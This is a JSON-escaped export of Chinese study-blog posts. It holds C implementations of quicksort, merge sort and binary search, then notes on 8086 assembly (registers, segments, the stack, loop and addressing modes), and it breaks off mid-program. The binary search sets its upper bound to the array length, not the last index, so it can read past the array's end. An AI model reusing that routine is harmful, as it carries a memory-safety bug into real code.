a[j] = temp;\n    }\n}\n\n//输出数组中的元素 \nvoid OutputArray(int* a, int len)\n{\n    for (int i = 0; i < len; i++)\n    {\n        printf(\"%d \", a[i]);\n    }\n\n    printf(\"\\n\");\n}\n```\n\n## 4.4 快速排序\n\n快速排序是对冒泡排序的一种改进。\n\n快速排序算法通过多次比较和交换来实现排序，其排序流程如下：\n\n(1)首先设定一个分界值，通过该分界值将数组分成左右两部分。\n\n(2)将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。此时，左边部分中各元素都小于分界值，而右边部分中各元素都大于或等于分界值。 \n\n(3)然后，左边和右边的数据可以独立排序。对于左侧的数组数据，又可以取一个分界值，将该部分数据分成左右两部分，同样在左边放置较小值，右边放置较大值。右侧的数组数据也可以做类似处理。\n\n(4)重复上述过程，可以看出，这是一个递归定义。通过递归将左侧部分排好序后，再递归排好右侧部分的顺序。当左、右两个部分各数据排序完成后，整个数组的排序也就完成了。\n\n```c\n# include <stdio.h>\n\nvoid QuickSort(int *, int, int);\nint FindPos(int *, int, int);\n\nint main()\n{\n    int a[6] = {2, 1, 0, 5, 4, 3};\n    int i;\n\n    QuickSort(a, 0 , 5); //第二个参数表示第一个元素的下标，第三个参数表示最后一个元素的下标\n\n    for(i=0;i<6;i++)\n        printf(\"%d \",a[i]);\n    printf(\"\\n\");\n\n}\n\nvoid QuickSort(int * a, int low, int high)\n{\n    int pos;\n\n    if(low < high)\n    {\n        pos = FindPos(a, low, high);\n        QuickSort(a, low, pos-1);\n        QuickSort(a, pos+1, high);\n    }\n}\n\nint FindPos(int * a, int low, int high)\n{\n    int val = a[low];\n    while(low < high)\n    {\n        while(low<high && a[high]>=val)\n            --high;\n        a[low] = a[high];\n\n        while(low<high && a[low]<=val)\n            ++low;\n        a[high] = a[low];\n    } //终止while循环之后low和high一定是相等的\n\n    a[low] = val;\n\n    return high; //high可以改为low，但不能改为val 也不能改为a[low] 也不能改为a[high]\n}\n```\n\n## 4.5 归并排序\n\n归并排序是建立在归并操作上的一种有效、稳定的排序算法，该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为二路归并。\n\n{% asset_img 归并排序.png 归并排序 %}\n\n```c\n#include <stdlib.h>\n#include <stdio.h>\n \nvoid Merge(int sourceArr[],int tempArr[], int startIndex, int midIndex, int endIndex)\n{\n    int i = startIndex, j=midIndex+1, k = startIndex;\n    while(i!=midIndex+1 && j!=endIndex+1)\n    {\n        if(sourceArr[i] > sourceArr[j])\n            tempArr[k++] = sourceArr[j++];\n        else\n            tempArr[k++] = sourceArr[i++];\n    }\n    while(i != midIndex+1)\n        tempArr[k++] = sourceArr[i++];\n    while(j != endIndex+1)\n        tempArr[k++] = sourceArr[j++];\n    for(i=startIndex; i<=endIndex; i++)\n        sourceArr[i] = tempArr[i];\n}\n \n//内部使用递归\nvoid MergeSort(int sourceArr[], int tempArr[], int startIndex, int endIndex)\n{\n    int midIndex;\n    if(startIndex < endIndex)\n    {\n        midIndex = startIndex + (endIndex-startIndex) / 2;//避免溢出int\n        MergeSort(sourceArr, tempArr, startIndex, midIndex);\n        MergeSort(sourceArr, tempArr, midIndex+1, endIndex);\n        Merge(sourceArr, tempArr, startIndex, midIndex, endIndex);\n    }\n}\n \nint main(int argc, char * argv[])\n{\n    int a[8] = {50, 10, 20, 30, 70, 40, 80, 60};\n    int i, b[8];\n    MergeSort(a, b, 0, 7);\n    for(i=0; i<8; i++)\n        printf(\"%d \", a[i]);\n    printf(\"\\n\");\n    return 0;\n}\n```\n\n## 4.6 折半查找\n\n折半查找的基本思想是：在有序表中，取中间记录作为比较对象，若给定值与中间记录的关键字相等，则查找成功；若给定值小于中间记录的关键字，则在中间记录的左半区继续查找；若给定值大于中间记录的关键字，则在中间记录的右半区继续查找。不断重复上述过程，直到查找成功或所有查找区域无记录，查找失败。\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\n//折半查找,又称为二分查找,条件保证要升序排序\nint Binary_Search(int *a,int n,int key)\n{\n    int low,high,mid;\n    low = 0;    //定义最低下标为记录首位\n    high = n;   //记录最高下标为记录末位\n\n    while ( low <= high )\n    {\n        mid = (low + high) / 2;\n        if (key < a[mid]) {\n            high = mid - 1;//最高位下标调小 一位\n        } else if(key > a[mid]){\n            low = mid + 1; //最低下标调整到中位下标大一位\n        } else{\n            return mid; //代表就是次位置\n        }\n    }\n    return -1; //没有找到返回-1\n}\n\nvoid main()\n{\n    int a[] = {1,2,3,4,5,6,7,8,9,10};\n\n    //需求要查找8, 如果用传统的方式 要查找8次才能得出\n    int index;\n    index = Binary_Search(a, sizeof(a) / sizeof(int),8);\n\n    if (index == -1)\n        printf(\"没有找到！\\n\");\n    else\n        printf(\"找到了,index为:%d\\n\",index);\n}\n```\n\n","categories":["基础知识"]},{"title":"x86汇编基础","url":"/posts/de6e58e0.html","content":"\n很久之前看王爽老师的《汇编语言》写的笔记，可能不太准确，先做个存档吧。\n\n<!--more-->\n\n# 1. 基础知识\n\n汇编指令是机器指令的助记符，同机器指令一一对应。\n\n每一种CPU都有自己的汇编指令集。\n\nCPU可以直接使用的信息在存储器中存放。\n\n指令和数据没有任何区别，都是二进制信息。\n\n存储单元从零开始顺序编号。\n\n存储器的存储单元可以存储1B，即8个二进制位。微机存储器的容量是以**字节**为最小单位来计算的。\n\n1B=8b, 1KB=1024B, 1MB=1024KB, 1GB=1024MB, 1TB=1024GB\n\n地址总线：\n\n- CPU是通过地址总线来指定存储单元的\n- 地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址\n- 一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N，这样的CPU最多可以寻找2的N次方个内存单元(B)\n\n数据总线：\n\n- CPU与内存或其他器件之间的数据传送是通过数据总线来进行的\n- 数据总线的宽度决定了CPU和外界的数据传送速度，8根数据总线一次可传送一个8位二进制数据(即1B)\n\n控制总线：\n\n- CPU对外部器件的控制是通过控制总线来进行的\n- 有多少根控制总线就意味着CPU提供了对外部器件的多少种控制\n- 控制总线的宽度决定了CPU对外部器件的控制能力\n\n# 2. 寄存器\n\n内部总线实现CPU内部各个器件之间的连接，外部总线实现CPU和主板上其他器件的联系。\n\n## 2.1 通用寄存器\n\nAX, BX, CX, DX\n\n以AX为例，数据18，二进制表示10010，小端序\n\n|      |      |      |      |      |      |      | AX   |      |      |      |      |      |      |      |      |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 15   | 14   | 13   | 12   | 11   | 10   | 9    | 8    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    |\n| 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 1    | 0    | 0    | 1    | 0    |\n|      |      | 8~15 | AH   |      |      |      |      |      |      |      | 0~7  | AL   |      |      |      |\n\nAH和AL可以看成是一个字型数据的高8位和低8位，也可以看成是两个独立的字节型数据。\n\n## 2.2 几条汇编指令\n\n{% asset_img 汇编指令举例.png 汇编指令举例 %}\n\n汇编指令不区分大小写。\n\n原AX=0000H，BX=0000H\n\n| 程序段中的指令 | 指令执行后AX中的数据 | 指令执行后BX中的数据 |\n| -------------- | -------------------- | -------------------- |\n| mov ax, 4E20H  | 4E20H                | 0000H                |\n| add ax, 1406H  | 6226H                | 0000H                |\n| mov bx, 2000H  | 6226H                | 2000H                |\n| add ax, bx     | 8226H                | 2000H                |\n| mov bx, ax     | 8226H                | 8226H                |\n| add ax, bx     | **044CH**            | 8226H                |\n\n## 2.3 物理地址\n\n```\n物理地址=段地址×16+偏移地址=基础地址+偏移地址\n```\n\nCPU可以用不同的段地址和偏移地址形成同一个物理地址。\n\n偏移地址16位，变化范围0~FFFFH，仅用偏移地址来寻址最多可寻$2^{16}B=2^{6}KB=64KB$个内存单元。\n\n## 2.4 CS 和 IP\n\nCS为代码段寄存器(存放段地址)，IP为指令指针寄存器(存放偏移地址)。\n\n同时修改CS、IP的内容：jmp 段地址：偏移地址\n\n```\njmp 3:0B16\t执行后：CS=0003H,IP=0B16H,CPU将从00030H+0B16H=00B46H处读取指令\n```\n\n仅修改IP的内容：jmp 某一合法寄存器\n\n```\njmp ax\t执行指令前：ax=1000H,CS=2000H,IP=0003H\n\t\t执行指令后：ax=1000H,CS=2000H,IP=1000H\n```\n\n8086CPU工作过程：\n\n1. 从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器\n2. IP指向下一条指令\n3. 执行指令（转到1，重复）\n\n# 3. 内存访问\n\n字单元：存放一个字型数据(16位)的内存单元，由两个地址连续的内存单元组成。高地址内存单元中存放字型数据的高位字节，低地址内存单元中存放字型数据的低位字节。\n\n起始地址为N的字单元简称为N地址字单元。比如一个字单元由2、3两个内存单元组成，则这个字单元的起始地址为2。\n\n## 3.1 DS 和 [address]\n\nDS为数据段寄存器(存放段地址)，[address]表示一个内存单元(存放偏移地址)。\n\n## 3.2 mov指令(add、sub指令同)\n\n1. 将数据直接送入寄存器：mov 寄存器，数据\n2. 将一个寄存器中的内容送人另一个寄存器：mov 寄存器，寄存器\n\n3. 将一个内存单元中的内容送入一个寄存器中：mov 寄存器，内存单元地址\n\n```asm\n将10000H(1000:0)中的数据读到al中:\nmov bx, 1000H\nmov ds, bx\nmov al, [0]\n```\n\n4. mov 内存单元，寄存器\n5. mov 段寄存器，寄存器\n\n8086CPU不支持将数据直接送入段寄存器的操作，ds是一个段寄存器，所以`mov ds,1000H`这条指令是非法的，只好用一个寄存器来进行中转，即先将1000H送入一个通用寄存器，再将通用寄存器的内容送入ds。\n\n```asm\n将al中的数据送入内存单元10000H中:\nmov bx, 1000H\nmov ds, bx\nmov [0], al\n```\n\n## 3.3 CPU提供的栈机制\n\n```asm\npush ax 表示将寄存器ax中的数据送入栈中\npop ax \t表示从栈顶取出数据送入ax\n```\n\n8086CPU的入栈和出栈操作都是以字为单位进行的。\n\nCPU如何知道栈顶位置？SS:SP，任意时刻，SS:SP指向栈顶元素。\n\npush ax由以下两步完成：\n\n1. SP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶\n2. 将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶\n\npop ax由以下两步完成：\n\n1. 将SS:SP指向的内存单元处的数据送入ax中\n2. SP=SP+2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶\n\n## 3.4 push指令(pop指令同)\n\n1. 将一个寄存器中的数据入栈：push 寄存器\n2. 将一个段寄存器中的数据入栈：push 段寄存器\n3. 将一个内存字单元处的字入栈：push 内存单元\n\n指令执行时，CPU要知道内存单元的地址，可以在push、pop指令中只给出内存单元的偏移地址，段地址在指令执行时，CPU从DS中取得。\n\n```asm\nmov ax,1000H\nmov ds,ax\npush [0]\t\t;将1000:0处的字压入栈\npop [2]\t\t\t;出栈的数据送入1000:2处\n```\n\n将10000H~1000FH这段空间当作栈，初始状态栈是空的，将ax, bx, DS中的数据入栈。\n\n```asm\nmov ax,1000H\nmov ss,ax\t\t;设置栈的段地址\nmov sp,0010H\t;设置栈的偏移地址,因栈为空,所以sp=000FH+0002H=0010H\npush ax\npush bx\npush ds\n```\n\npush、pop等栈操作指令，修改的只是SP。也就是说，栈顶的变化范围最大为0~FFFFH\n\n一个栈段的容量最大为64KB。\n\n在10000H处写入字型数据2266H\n\n```asm\n方法一\nmov ax,1000H\nmov ds,ax\nmov ax,2266H\nmov [0],ax\n\n方法二\nmov ax,1000H\nmov ss,ax\nmov sp,2\nmov ax,2266H\npush ax\n```\n\n## 3.5 段的综述\n\n对于数据段，将它的段地址放在DS中，用mov、add、sub等访问内存单元的指令时，CPU就将我们定义的数据段中的内容当作数据来访问。\n\n对于代码段，将它的段地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就将执行我们定义的代码中的指令。\n\n对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地址放在SP中，这样CPU在需要进行栈操作的时候，比如执行push、pop指令等，就将我们定义的栈段当作栈空间来用。\n\nCPU将内存中的某段内容当作代码，是因CS:IP指向了那里；CPU将某段内存当作栈，是因为SS:SP指向了那里。\n\n# 4. 第一个程序\n\n```asm\nassume cs:codesg\n\ncodesg segment\n\nmov ax,0123H\nmov bx,0456H\nadd ax,bx\nadd ax,ax\n\nmov ax,4c00H\nint 21H\n\ncodesg ends\n\nend\n```\n\n在汇编语言程序中包含两种指令：伪指令、汇编指令。汇编指令是有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。伪指令没有对应的机器指令，最终不被CPU执行。伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作。\n\n## 4.1 伪指令\n\n### 4.1.1 XXX segment …… XXX ends\n\nsegment和ends的功能是定义一个段，segment说明一个段开始，ends说明一个段结束。\n\n一个有意义的汇编程序中至少要有一个段，这个段用来存放代码。\n\n### 4.1.2 end\n\nend是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，如果碰到了伪指令end，就结束对源程序的编译。\n\n### 4.1.3 assume\n\n这条伪指令的含义为“假设”，它假设某一段寄存器和程序中的某一个用segment...ends定义的段相关联。通过assume说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系。\n\n## 4.2 汇编指令\n\n## 4.3 标号\n\n一个标号指代了一个地址，比如“codesg”。codesg在segment前面，作为一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址。\n\n## 4.4 程序的结构\n\n编程运算$2^3$\n\n1. 定义一个段，名称为abc\n\n```asm\nabc segment\nabc ends\n```\n\n2. 在这个段中写入汇编指令，来实现我们的任务\n\n```asm\nabc segment\nmov ax,2\nadd ax,ax\nadd ax,ax\nabc ends\n```\n\n3. 指出程序要在何处结束\n\n```asm\nabc segment\nmov ax,2\nadd ax,ax\nadd ax,ax\nabc ends\nend\n```\n\n4. abc被当作代码段来用，所以应该将abc和cs联系起来\n\n```asm\nassume cs:abc\nabc segment\nmov ax,2\nadd ax,ax\nadd ax,ax\nabc ends\nend\n```\n\n5. 程序返回\n\n```asm\nassume cs:abc\nabc segment\nmov ax,2\nadd ax,ax\nadd ax,ax\nmov ax,4c00H\nint 21H\nabc ends\nend\n```\n\n6. 语法错误和逻辑错误\n\n## 4.5 编译\n\n源程序文件.asm->目标文件.obj\n\n## 4.6 连接\n\n目标文件.obj->可执行文件.exe\n\n# 5. [bx]和loop指令\n\n[bx]同样表示一个内存单元，它的偏移地址在bx中。\n\n“()”中的元素可以有3种类型：①寄存器名；②段寄存器名；③内存单元的物理地址。\n\n(ax)表示ax中的内容，(20000H)表示内存20000H单元的内容，((ds)*16+(bx))表示ds中的内容为ADR1，bx中的内容为ADR2，内存ADR1\\*16+ADR2单元的内容，即内存ADR1:ADR2单元的内容。\n\n约定idata表示常量。\n\n```\nmov ax,[idata]\nmov ax,idata\n```\n\n```\nmov ax,[bx]\t\t;(ax)=((ds)*16+(bx))\nmov [bx],ax\t\t;((ds)*16+(bx))=(ax)\n```\n\n```\ninc bx\t\t\t;inc bx的含义是bx中的内容加1\n```\n\n## 5.1 loop指令\n\nloop指令的格式：loop 标号\n\nCPU执行loop指令的时候要进行两步操作：\n\n1. (cx)=(cx)-1\n2. 判断cx中的值，不为零则转至标号处执行程序，为零则向下执行\n\n编程运算$2^{12}$\n\n```asm\nassume cs:code\ncode segment\n\tmov ax,2\n\tmov cx,11\ns:\tadd ax,ax\n\tloop s\n\tmov ax,4c00H\n\tint 21H\ncode ends\nend\n```\n\ncx和loop指令相配合实现循环功能：①在cx中存放循环次数；②loop指令中的标号所标识地址要在前面；③要循环执行的程序段，要写在标号和loop指令的中间。\n\n**在汇编源程序，数据不能以字母开头**，所以要在前面加0。`A000H`在汇编源程序中要写为`0A000H`。\n\n```asm\nmov al,[0]\t\t;(al)=0,将常量0送入al中(mov al,0含义相同)\nmov al,ds:[0]\t;(al)=((ds)*16+0),将内存单元中的数据送入al中\nmov al,[bx]\t\t;(al)=((ds)*16+(bx)),将内存单元中的数据送入al中\nmov al,ds:[bx]\t;与mov al,[bx]含义相同\n```\n\n（1）在汇编源程序中，如果用指令访问一个内存单元，则在指令中必须用”[]“来表示存储单元，如果在”[]“里用一个常量idata直接给出内存单元的偏移地址，就要在”[]“的前面显式地给出段地址所在的寄存器。比如`mov al,ds:[0]`\n\n如果没有在”[]“的前面显式地给出段地址所在的段寄存器，那么编译器会把指令中的[idata]解释为data，比如`mov al,[0]`\n\n（2）如果在”[]“里用寄存器，比如bx，间接给出内存单元的偏移地址，则段地址默认在ds中。当然也可以显式地给出段地址所在的段寄存器。\n\n## 5.2 一段安全的空间\n\n我们需要直接向一段内存中写入内容，这段内存空间不应存放系统或其他程序的数据或代码，否则写入操作很可能引发错误。DOS方式下，一般情况，0:200~0:2ff空间中没有系统或其他程序的数据或代码。\n\n## 5.3 loop和[bx]的联合应用\n\n在循环中，源始单元ffff:X和目标单元0020:X的偏移地址X是变量，可以用bx来存放。\n\n## 5.4 段前缀\n\n{% asset_img 段前缀.PNG 段前缀 %}\n\n# 6. 包含多个段的程序\n\n```asm\nassume cs:code\ncode segment\n\tdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\n\tmov bx,0\n\tmov ax,0\n\t\n\tmov cx,8\ns:add ax,cs:[bx]\n\tadd bx,2\n\tloop s\n\t\n\tmov ax,4c00h\n\tint 21h\ncode ends\nend\n```\n\ndw即define word，定义字型数据。\n\n程序在运行的时候CS中存放代码段的段地址，所以可以从CS中得到它们的段地址。dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时，它们的地址就是cs:0, cs:2, cs:4, cs:6, cs:8, cs:a, cs:c, cs:e。\n\nend除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方。`end 标号`\n\n```asm\nassume cs:code\ncode segment\n\tdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\nstart:\tmov bx,0\t\t;程序的第一条指令\n\t\tmov ax,0\n\t\n        mov cx,8\n    s:add ax,cs:[bx]\n        add bx,2\n        loop s\n\n        mov ax,4c00h\n        int 21h\ncode ends\nend start\n```\n\n## 6.1 在代码段中使用栈\n\n程序运行时，定义的数据存放在cs:0\\~cs:F单元中，共8个字单元。依次将这8个字单元中的数据入栈，然后再依次出栈到这8个字单元中，从而实现数据的逆序存放。（将cs:10\\~cs:2F的内存空间当作栈来用）\n\n```asm\nassume cs:codesg\ncodesg segment\n\tdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\n\tdw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\n\t\t\t;用dw定义16个字型数据，在程序加载后，将取得16个字的内存空间存放这16个数据\n\t\t\t;在后面的程序中将这段空间当作栈来使用\nstart:\tmov ax,cs\n\t\tmov ss,ax\n\t\tmov sp,30h\t\t;将设置栈顶ss:sp指向cs:30\n\t\t\n\t\tmov bx,0\n\t\tmov cx,8\ns:\t\tpush cs:[bx]\n\t\tadd bx,2\n\t\tloop s\t\t\t;将代码段0~15单元中的8个字型数据依次入栈\n\t\t\n\t\tmov bx,0\n\t\tmov cx,8\ns0:\t\tpop cs:[bx]\n\t\tadd bx,2\n\t\tloop s0\t\t\t;出栈8个字型数据到代码段0~15单元中\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\t\t\t\t;指明程序的入口在start处\n```\n\n## 6.2 将数据、代码、栈放入不同的段\n\n在前面的内容中，我们在程序中用到了数据和栈，将数据、栈和代码都放到了一个段里面。我们在编程的时候要注意何处是数据，何处是栈，何处是代码。这样做会产生两个问题：\n\n1. 把它们放到一个段中使程序显得混乱\n2. 前面数据中处理的数据很少，用到的栈空间也小，加上没有多长的代码，放到一个段里面没有问题。但如果数据、栈、代码需要的空间超过64KB，就不能放在一个段中（8086模式中一个段的容量不能大于64KB）\n\n```asm\nassume cs:code,ds:data,ss:stack\ndata segment\n\tdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\ndata ends\nstack segment\n\tdw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\nstack ends\ncode segment\nstart:\tmov ax,stack\t;将名为stack段的段地址送入ax\n\t\tmov ss,ax\n\t\tmov sp,20h\t\t\n;设置栈顶ss:sp指向stack:20(在整个程序中是cs:30,但在栈段是从0:10~0:2F,所以是stack:20)\n\t\tmov ax,data\n\t\tmov ds,ax\t\t;ds指向data段\n\t\tmov bx,0\t\t;ds:bx指向data段中的第一个单元\n\t\t\n\t\tmov cx,8\ns:\t\tpush [bx]\n\t\tadd bx,2\n\t\tloop s\t\t\t;将data段中的0~15单元中的8个字型数据依次入栈\n\t\t\n\t\tmov cx,8\ns0:\t\tpop [bx]\n\t\tadd bx,2\n\t\tloop s0\t\t\t;依次出栈8个字型数据到data段的0~15单元中\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncode ends\nend start\n```\n\n# 7. 更灵活的定位内存地址的方法\n\n## 7.1 and和or指令\n\n```asm\nand指令:逻辑与指令，按位进行与运算(1and1=1,1and0=0,0and0=0)\nmov al,01100011B\nand al,00111011B\n执行后:al=00100011B\n\nor指令:逻辑或指令，按位进行或运算(1or1=1,1or0=1,0or0=0)\nmov al,01100011B\nor al,00111011B\n执行后:al=01111011B\n```\n\n## 7.2 ASCII码\n\n```\na->61h,b->62h\n```\n\n## 7.3 以字符形式给出的数据\n\n在汇编程序中，用''的方式指明数据是以字符的形式给出的，编译器将它们转化为相对应的ASCII码。\n\n```asm\nassume cs:code,ds:data\ndata segment\n\tdb 'unIX'\n\tdb 'foRK'\ndata ends\ncode segment\nstart:\tmov al,'a'\n\t\tmov bl,'b'\n\t\tmov ax,4c00h\n\t\tint 21h\ncode ends\nend start\n```\n\n## 7.4 大小写转换的问题\n\n在codesg中填写代码，将tadasg中的第一个字符串转化为大写，第二个字符串转化为小写。\n\n{% asset_img ASCII二进制十六进制.jpg ASCII码表 %}\n\n方法一：小写字母的ASCII码值比大写字母的ASCII码值大20H。\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n\tdb 'BaSiC'\n\tdb 'iNfOrMaTiOn'\ndatasg ends\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov bx,0\n\t\tmov cx,5\n\ts:\tmov al,[bx]\n\t\t如果(al)>61H,则为小写字母的ASCII码,则:sub al,20h\n\t\tmov [bx],al\n\t\tinc bx\n\t\tloop s\ncodesg ends\nend start\n```\n\n方法二：大写字母的第6位全为0，小写字母的第6位全为1。\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n\tdb 'BaSiC'\n\tdb 'iNfOrMaTiOn'\ndatasg ends\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\t\t;设置ds指向datasg段\n\t\tmov bx,0\t\t;设置(bx)=0,ds:bx指向'BaSiC'的第一个字母\n\t\tmov cx,5\n\ts:\tmov al,[bx]\t\t;将ASCII码从ds:bx所指向的单元中取出\n\t\tand al,11011111B;将al中的ASCII码的第6位置0,变为大写字母\n\t\tmov [bx],al\n\t\tinc bx\n\t\tloop s\n\t\t\n\t\tmov bx,5\t\t;设置(bx)=5,ds:bx指向'iNfOrMaTiOn'的第一个字母\n\t\tmov cx,11\n\ts0: mov al,[bx]\n\t\tor al,00100000B\n\t\tmov [bx],al\n\t\tinc bx\n\t\tloop s0\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n## 7.5 [bx+idata]\n\n[bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata\n\nmov ax,[bx+200]->(ax)=((ds)*16+(bx)+200)\n\n简化7.4方法二(但这个一定要两个字符串长度相同)\n\n```asm\n    mov ax,datasg\n    mov ds,ax\n    mov bx,0\n\n    mov cx,5\ns:\tmov al,[bx]\t\t;定位第一个字符串中的字符\n\tand al,11011111b\n\tmov [bx],al\n\tmov al,[5+bx]\t;定位第二个字符串中的字符\n\tor al,00100000b\n\tmov [5+bx],al\n\tinc bx\n\tloop s\n```\n\n[bx]=0[bx]，[5+bx]=5[bx]\n\n## 7.6 SI 和 DI\n\nsi 和 di不能够分成两个8位寄存器来使用。\n\n用ds:si指向要复制的源始字符串，用ds:di指向复制的目的空间。\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n db 'welcome to masm!'\n db '................'\ndatasg ends\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov si,0\n\t\tmov di,16\t\t;复制到它后面的数据区，后面数据区的偏移地址为16\n\t\t\n\t\tmov cx,8\t\t;一次复制2个字节，一共循环8次\n\ts:\tmov ax,[si]\n\t\tmov [di],ax\n\t\tadd si,2\n\t\tadd di,2\n\t\tloop s\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n利用[bx(si或di)+idata]的方式使程序变简洁：\n\n```asm\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov si,0\n\t\tmov cx,8\n\ts:\tmov ax,0[si]\n\t\tmov 16[si],ax\n\t\tadd si,2\n\t\tloop s\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n## 7.7 [bx+si]和[bx+di]\n\n[bx+si]表示一个内存单元，它的偏移地址为(bx)+(si)，[bx+di]同。\n\nmov ax,[bx+si]->(ax)=((ds)*16+(bx)+(si))\n\nmov ax,[bx+si]=mov ax,[bx\\][si]\n\n## 7.8 [bx+si+idata]和[bx+di+idata]\n\n[bx+si+idata]表示一个内存单元，它的偏移地址为(bx)+(si)+idata，[bx+di+idata]同。\n\nmov ax,[bx+si+idata]->(ax)=((ds)*16+(bx)+(si)+idata)\n\n```asm\n  mov ax,[bx+si+idata]\n= mov ax,idata[bx][si]\n= mov ax,[bx].idata[si]\n= mov ax,[bx][si].idata\n```\n\n## 7.9 不同寻址方式的灵活应用\n\n编程，将datasg段中每个单词首字母改为大写字母(用bx定位每行的起始地址，用3定位要修改的列，用[bx+idata]对目标单元进行寻址)\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n\tdb '1..file.........'\t;16个字节\n\tdb '2..edit.........'\n\tdb '3..search.......'\n\tdb '4..view.........'\ndatasg ends\ncodesg segment\nstart: \tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov bx,0\n\t\tmov cx,4\n\ts:  mov al,[bx+3]\n\t\tand al,11011111b\n        mov [bx+3],al\n\t\tadd bx,16\n\t\tloop s\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n编程，将datasg段中每个单词改为大写字母(用bx定位每行的起始地址，用si定位要修改的列，用[bx+si]方式对目标单元进行寻址)\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n\tdb 'ibm.............'\n\tdb 'dec.............'\n\tdb 'dos.............'\n\tdb 'vax.............'\ndatasg ends\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov bx,0\n\t\tmov cx,4\n\ts0: mov dx,cx\t\t\t;将外层循环的cx值保存在dx中\n\t\tmov si,0\n\t\t\n\t\tmov cx,3\t\t\t;cx设置为内层循环的次数\n\ts:\tmov al,[bx+si]\n\t\tand al,11011111b\n\t\tmov [bx+si],al\n\t\tinc si\n\t\tloop s\n\t\t\n\t\tadd bx,16\n\t\tmov cx,dx\t\t\t;用dx中存放的外层循环的计数值恢复cx\n\t\tloop s0\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n如果dx也被用了呢？所有寄存器都被用了呢？可以使用内存。\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n\tdb 'ibm.............'\n\tdb 'dec.............'\n\tdb 'dos.............'\n\tdb 'vax.............'\n\tdw 0\t\t\t\t\t;定义一个字，用来暂存cx\ndatasg ends\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov bx,0\n\t\tmov cx,4\n\ts0: mov ds:[40h],cx\t\t;将外层循环的cx值保存在datasg:40h单元中\n\t\tmov si,0\n\t\t\n\t\tmov cx,3\t\t\t;cx设置为内层循环的次数\n\ts:\tmov al,[bx+si]\n\t\tand al,11011111b\n\t\tmov [bx+si],al\n\t\tinc si\n\t\tloop s\n\t\t\n\t\tadd bx,16\n\t\tmov cx,ds:[40h]\t\t;用datasg:40h单元中的值恢复cx\n\t\tloop s0\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n如果需要保存多个数据，需要记住哪个数据暂存在哪个单元中，这样程序容易混乱。一般来说，在需要暂存数据的时候，我们都应该使用栈。\n\n```asm\nassume cs:codesg,ds:datasg,ss:stacksg\ndatasg segment\n\tdb 'ibm.............'\n\tdb 'dec.............'\n\tdb 'dos.............'\n\tdb 'vax.............'\ndatasg ends\nstacksg segment\n\tdw 0,0,0,0,0,0,0,0\nstacksg ends\ncodesg segment\nstart:\tmov ax,stacksg\n\t\tmov ss,ax\n\t\tmov sp,16\n\t\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov bx,0\n\t\tmov cx,4\n\ts0: push cx\t\t\t\t;将外层循环的cx值压栈\n\t\tmov si,0\n\t\t\n\t\tmov cx,3\t\t\t;cx设置为内层循环的次数\n\ts:\tmov al,[bx+si]\n\t\tand al,11011111b\n\t\tmov [bx+si],al\n\t\tinc si\n\t\tloop s\n\t\t\n\t\tadd bx,16\n\t\tpop cx\t\t\t\t;从栈顶弹出原cx的值恢复cx\n\t\tloop s0\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg 